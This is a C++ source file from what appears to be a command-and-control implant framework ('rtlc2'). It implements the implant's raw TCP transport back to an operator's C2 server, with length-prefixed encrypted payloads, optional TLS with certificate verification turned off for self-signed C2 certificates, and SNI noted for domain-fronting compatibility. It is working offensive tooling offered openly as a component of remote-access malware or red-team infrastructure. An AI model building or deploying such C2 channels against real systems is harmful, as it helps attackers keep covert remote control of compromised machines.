// TCP Raw Transport - Direct TCP socket with optional TLS for C2 communication
// Framed protocol: [4-byte length (network byte order)][encrypted payload]
// Supports IPv4/IPv6 dual-stack, socket timeouts, and TLS wrapping
#include "transport.h"
#include <cstring>

#ifdef RTLC2_WINDOWS
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define CLOSESOCKET closesocket
typedef int socklen_t;
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#define CLOSESOCKET close
#endif

namespace rtlc2 {
namespace transport {

TCPTransport::TCPTransport(const std::string& host, int port, bool use_tls)
    : host_(host), port_(port), use_tls_(use_tls), sock_(-1)
#ifndef RTLC2_WINDOWS
    , ssl_(nullptr), ssl_ctx_(nullptr)
#endif
{}

TCPTransport::~TCPTransport() {
    Disconnect();
}

// Set socket send/recv timeouts (30 seconds)
static void SetSocketTimeouts(int sock) {
#ifdef RTLC2_WINDOWS
    DWORD timeout_ms = 30000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
#else
    struct timeval tv = { 30, 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
#endif
}

bool TCPTransport::Connect() {
#ifdef RTLC2_WINDOWS
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    struct addrinfo hints = {}, *result = nullptr;
    hints.ai_family = AF_UNSPEC;  // IPv4/IPv6 dual-stack
    hints.ai_socktype = SOCK_STREAM;

    char portStr[8];
    snprintf(portStr, sizeof(portStr), "%d", port_);

    if (getaddrinfo(host_.c_str(), portStr, &hints, &result) != 0)
        return false;

    // Try each resolved address (IPv6 first if available, then IPv4)
    struct addrinfo* rp;
    for (rp = result; rp != nullptr; rp = rp->ai_next) {
        sock_ = (int)socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock_ < 0) continue;

        if (connect(sock_, rp->ai_addr, (int)rp->ai_addrlen) == 0)
            break; // success

        CLOSESOCKET(sock_);
        sock_ = -1;
    }

    freeaddrinfo(result);

    if (sock_ < 0) return false;

    // Set 30-second send/recv timeouts to prevent agent hangs
    SetSocketTimeouts(sock_);

    // TLS wrapping (POSIX via OpenSSL)
#ifndef RTLC2_WINDOWS
    if (use_tls_) {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();

        ssl_ctx_ = SSL_CTX_new(TLS_client_method());
        if (!ssl_ctx_) {
            CLOSESOCKET(sock_);
            sock_ = -1;
            return false;
        }

        // Minimum TLS 1.2 for security
        SSL_CTX_set_min_proto_version((SSL_CTX*)ssl_ctx_, TLS1_2_VERSION);

        // Disable certificate verification for self-signed C2 certs
        // (operator controls both ends; verify_cert_ can be enabled for hardened setups)
        if (!verify_cert_) {
            SSL_CTX_set_verify((SSL_CTX*)ssl_ctx_, SSL_VERIFY_NONE, nullptr);
        }

        ssl_ = SSL_new((SSL_CTX*)ssl_ctx_);
        if (!ssl_) {
            SSL_CTX_free((SSL_CTX*)ssl_ctx_);
            ssl_ctx_ = nullptr;
            CLOSESOCKET(sock_);
            sock_ = -1;
            return false;
        }

        SSL_set_fd((SSL*)ssl_, sock_);

        // SNI for domain fronting compatibility
        if (!host_.empty()) {
            SSL_set_tlsext_host_name((SSL*)ssl_, host_.c_str());
        }

        if (SSL_connect((SSL*)ssl_) != 1) {
            SSL_free((SSL*)ssl_);
            ssl_ = nullptr;
            SSL_CTX_free((SSL_CTX*)ssl_ctx_);
            ssl_ctx_ = nullptr;
            CLOSESOCKET(sock_);
            sock_ = -1;
            return false;
        }
    }
#else
    // Windows TLS: For Windows builds, TLS is typically handled at a higher
    // layer (WinHTTP in HTTP transport, or Schannel). TCP+TLS on Windows
    // uses the same OpenSSL path when cross-compiled with MinGW+OpenSSL.
    // Native MSVC builds should use the HTTP/HTTPS transport for TLS.
    (void)use_tls_;
#endif

    connected_ = true;
    return true;
}

void TCPTransport::Disconnect() {
#ifndef RTLC2_WINDOWS
    if (ssl_) {
        SSL_shutdown((SSL*)ssl_);
        SSL_free((SSL*)ssl_);
        ssl_ = nullptr;
    }
    if (ssl_ctx_) {
        SSL_CTX_free((SSL_CTX*)ssl_ctx_);
        ssl_ctx_ = nullptr;
    }
#endif

    if (sock_ >= 0) {
        CLOSESOCKET(sock_);
        sock_ = -1;
    }
    connected_ = false;
}

bool TCPTransport::IsConnected() const {
    return connected_ && sock_ >= 0;
}

// Internal: send raw bytes through the socket (TLS-aware)
int TCPTransport::SendRaw(const void* buf, int len) {
#ifndef RTLC2_WINDOWS
    if (ssl_) return SSL_write((SSL*)ssl_, buf, len);
#endif
    return send(sock_, (const char*)buf, len, 0);
}

// Internal: receive raw bytes from the socket (TLS-aware)
int TCPTransport::RecvRaw(void* buf, int len) {
#ifndef RTLC2_WINDOWS
    if (ssl_) return SSL_read((SSL*)ssl_, buf, len);
#endif
    return recv(sock_, (char*)buf, len, 0);
}

// Send with length-prefix framing
Response TCPTransport::Send(const std::vector<uint8_t>& data) {
    Response resp = {};
    if (sock_ < 0) {
        resp.error = "Not connected";
        return resp;
    }

    // Write 4-byte length prefix (network byte order)
    uint32_t netLen = htonl((uint32_t)data.size());
    int sent = SendRaw(&netLen, 4);
    if (sent != 4) {
        resp.error = "Failed to send length";
        connected_ = false;
        return resp;
    }

    // Write data with retry loop for partial sends
    int totalSent = 0;
    while (totalSent < (int)data.size()) {
        sent = SendRaw(data.data() + totalSent, (int)data.size() - totalSent);
        if (sent <= 0) {
            resp.error = "Send failed";
            connected_ = false;
            return resp;
        }
        totalSent += sent;
    }

    resp.success = true;
    resp.status_code = 200;
    return resp;
}

// Receive with length-prefix framing
Response TCPTransport::Receive() {
    Response resp = {};
    if (sock_ < 0) {
        resp.error = "Not connected";
        return resp;
    }

    // Read 4-byte length prefix (loop for partial reads under TLS)
    uint8_t lenBuf[4] = {};
    int totalLen = 0;
    while (totalLen < 4) {
        int received = RecvRaw(lenBuf + totalLen, 4 - totalLen);
        if (received <= 0) {
            resp.error = "Failed to read length";
            connected_ = false;
            return resp;
        }
        totalLen += received;
    }

    uint32_t len = ntohl(*(uint32_t*)lenBuf);
    if (len > 10 * 1024 * 1024) { // 10MB max
        resp.error = "Message too large";
        return resp;
    }

    resp.body.resize(len);
    int totalRecv = 0;
    while (totalRecv < (int)len) {
        int received = RecvRaw(resp.body.data() + totalRecv, (int)len - totalRecv);
        if (received <= 0) {
            resp.error = "Receive failed";
            connected_ = false;
            return resp;
        }
        totalRecv += received;
    }

    resp.success = true;
    resp.status_code = 200;
    return resp;
}

} // namespace transport
} // namespace rtlc2
